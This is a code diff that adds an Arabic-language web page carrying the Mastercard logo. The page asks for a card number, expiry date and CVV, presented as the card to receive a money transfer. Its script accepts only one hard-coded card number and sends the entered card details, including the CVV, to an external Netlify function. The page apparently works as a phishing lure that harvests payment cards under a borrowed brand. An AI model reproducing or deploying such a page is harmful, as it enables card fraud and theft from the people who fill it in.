@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معلومات البطاقة</title>
+    <style>
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            flex-direction: column;
+        }
+        .logo-container {
+            margin-bottom: 20px;
+            animation: fadeIn 1.5s ease-in-out forwards;
+            opacity: 0;
+        }
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            animation: fadeIn 1.5s ease-in-out forwards;
+            opacity: 0;
+            direction: rtl; /* لجعل الحقول تبدأ من اليمين */
+        }
+        h1 {
+            color: #000;
+            font-size: 2em;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #000;
+            font-size: 1.2em;
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end; /* محاذاة الحقول إلى اليمين */
+        }
+        .form-group {
+            margin-bottom: 15px;
+            width: 100%;
+            max-width: 400px;
+            text-align: right; /* محاذاة النصوص إلى اليمين */
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 1em;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            direction: ltr; /* لجعل النصوص داخل الحقول تبدأ من اليسار */
+        }
+        .submit-button {
+            padding: 10px 20px;
+            font-size: 1em;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .error-message {
+            color: red;
+            font-size: 1em;
+            margin-top: 10px;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+            p {
+                font-size: 1em;
+            }
+            .submit-button {
+                padding: 8px 16px;
+                font-size: 0.9em;
+            }
+        }
+        @media (max-width: 400px) {
+            h1 {
+                font-size: 1.2em;
+            }
+            p {
+                font-size: 0.9em;
+            }
+            .submit-button {
+                padding: 6px 12px;
+                font-size: 0.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" alt="MasterCard Logo" width="150">
+    </div>
+    <div class="container">
+        <h1>معلومات البطاقة</h1>
+        <p>يرجى إدخال معلومات البطاقة المراد تحويل الأموال إليها:</p>
+        <form id="payment-form">
+            <div class="form-group">
+                <label for="card-number">رقم البطاقة</label>
+                <input type="text" id="card-number" name="card-number" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
+            </div>
+            <div class="form-group">
+                <label for="expiry-date">تاريخ انتهاء الصلاحية</label>
+                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">رمز الأمان (CVV)</label>
+                <input type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="3" oninput="formatCVV(this)" required>
+            </div>
+            <button type="submit" class="submit-button">متابعة</button>
+            <p id="error-message" class="error-message"></p>
+        </form>
+    </div>
+    <script>
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s+/g, '');
+            if (value.length > 16) {
+                value = value.slice(0, 16);
+            }
+            let formattedValue = value.match(/.{1,4}/g);
+            input.value = formattedValue ? formattedValue.join(' ') : '';
+        }
+
+        function formatExpiryDate(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 4) {
+                value = value.slice(0, 4);
+            }
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            input.value = value;
+        }
+
+        function formatCVV(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 3) {
+                value = value.slice(0, 3);
+            }
+            input.value = value;
+        }
+
+        document.getElementById('payment-form').onsubmit = async function(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const errorMessage = document.getElementById('error-message');
+
+            if (cardNumber !== '5556960012505071') {
+                errorMessage.textContent = 'رقم البطاقة غير صالح.';
+                return;
+            }
+
+            if (cardNumber.length < 16 || expiryDate.length < 5 || cvv.length < 3) {
+                errorMessage.textContent = 'يرجى ملء جميع الحقول بشكل صحيح.';
+                return;
+            }
+
+            try {
+                // إرسال البيانات إلى دالة Convex عبر واجهة HTTP
+                const response = await fetch('https://marvelous-marshmallow-9f6953.netlify.app/.netlify/functions/save-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        cardNumber,
+                        expiryDate,
+                        cvv,
+                        timestamp: new Date().toISOString()
+                    }),
+                });
+
+                if (response.ok) {
+                    window.location.href = 'confirmation.html'; // إعادة توجيه المستخدم إلى صفحة التأكيد
+                } else {
+                    throw new Error('فشل إرسال البيانات.');
+                }
+            } catch (error) {
+                errorMessage.textContent = 'فشل إرسال البيانات: ' + error.message;
+            }
+        };
+    </script>
+</body>
+</html>
